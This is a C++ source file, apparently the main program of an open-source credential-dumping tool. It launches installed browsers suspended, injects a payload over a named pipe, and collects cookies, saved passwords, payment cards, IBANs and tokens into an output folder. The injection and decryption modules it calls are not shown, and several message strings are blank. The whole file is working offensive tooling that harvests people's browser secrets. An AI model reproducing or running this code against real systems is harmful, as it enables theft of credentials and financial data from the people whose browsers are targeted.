// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../core/console.hpp"
#include "../sys/internal_api.hpp"
#include "browser_discovery.hpp"
#include "browser_terminator.hpp"
#include "process_manager.hpp"
#include "pipe_server.hpp"
#include "injector.hpp"
#include <iostream>

using namespace Injector;

struct GlobalStats {
    int successful = 0;
    int failed = 0;
    int skipped = 0;
};

void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, bool First,
    const std::filesystem::path& output, const Core::Console& console, GlobalStats& stats) {

    console.BrowserHeader(browser.displayName, browser.version);

    try {
     

        ProcessManager procMgr(browser);
        procMgr.CreateSuspended();

        PipeServer pipe(browser.type);
        pipe.Create();

        PayloadInjector injector(procMgr, console);
        injector.Inject(pipe.GetName());

        injector.ResumeRemoteThread();
        pipe.WaitForClient();

        pipe.SendConfig(verbose, fingerprint, output, browser.version);
        pipe.ProcessMessages(verbose);

        auto pStats = pipe.GetStats();
        if (pStats.noAbe) {
            // ABE not enabled - not a failure, just skip
            stats.skipped++;
        }
        else if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0 || pStats.tokens > 0) {
            console.Summary(pStats.cookies, pStats.passwords, pStats.cards, pStats.ibans, pStats.tokens,
                pStats.profiles, (output / browser.displayName).string());
            stats.successful++;
        }
        else {
            stats.failed++;
        }

        procMgr.Terminate();

    }
    catch (const std::exception&) {
        stats.failed++;
    }
}

int wmain(int argc, wchar_t* argv[]) {
    bool verbose = false;
    bool fingerprint = false;
    bool killBrowsers = false;
    std::wstring targetType;
    std::filesystem::path output = std::filesystem::current_path() / "output";

    Core::Console console(false);

    for (int i = 1; i < argc; ++i) {
        std::wstring arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v") verbose = true;
        else if (arg == L"--fingerprint" || arg == L"-f") fingerprint = true;
        else if (arg == L"--keep" || arg == L"-k") killBrowsers = true;
        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc) output = argv[++i];
        else if (arg == L"--help" || arg == L"-h") {
           
            return 0;
        }
        else if (targetType.empty() && arg[0] != L'-') targetType = arg;
    }

    Core::Console mainConsole(verbose);
    mainConsole.Banner();

    if (targetType.empty()) {
      
        return 1;
    }

    if (!Sys::InitApi(verbose)) {
        mainConsole.Error("");
        return 1;
    }

    std::filesystem::create_directories(output);

    GlobalStats stats;

    if (targetType == L"all") {
        auto browsers = BrowserDiscovery::FindAll();
        if (browsers.empty()) {
            mainConsole.Warn("");
            return 0;
        }
        for (const auto& browser : browsers) {
            ProcessBrowser(browser, verbose, fingerprint, killBrowsers, output, mainConsole, stats);
        }
    }
    else {
        auto browser = BrowserDiscovery::FindSpecific(targetType);
        if (!browser) {
            mainConsole.Error("");
            return 1;
        }
        ProcessBrowser(*browser, verbose, fingerprint, killBrowsers, output, mainConsole, stats);
    }

    return 0;
}
